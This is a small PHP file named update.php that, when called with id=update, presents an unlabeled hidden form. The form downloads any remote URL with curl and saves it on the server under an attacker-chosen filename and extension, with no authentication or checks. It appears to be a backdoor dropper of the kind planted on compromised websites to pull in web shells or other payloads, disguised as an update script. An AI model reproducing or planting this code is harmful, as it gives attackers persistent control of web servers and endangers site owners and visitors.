<?
if($_GET[id]=="update"){
function fretuwa($link,$name=null,$silver)
{

$link_info = pathinfo($link);  // 
$silver = $silver; // 
$file = ($name) ? $name.'.'.$silver : $link_info['basename']; 
// 

$curl = curl_init($link);
$fopen = fopen($file,'w');

curl_setopt($curl, CURLOPT_HEADER,0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl, CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_0);
curl_setopt($curl, CURLOPT_FILE, $fopen);

curl_exec($curl);
curl_close($curl);
fclose($fopen);

}
if($_POST[git]){
fretuwa("$_POST[xfile]","$_POST[giv]","$_POST[silver]");
}
?>
<table>
<form action="update.php?id=update" method="post">
<tr>
	<td>L</td>
	<td><input type="text" name="xfile" /></td>
</tr>

<tr>
	<td>D</td>
	<td><input type="text" name="giv" /></td>
</tr>

<tr>
	<td>U</td>
	<td><input type="text" name="silver" /></td>
</tr>
<tr>
	<td></td>
	<td><input type="submit" value=" " name="git" /></td>
</tr>

</form>
</table>
</body>
</html>
<? } ?>
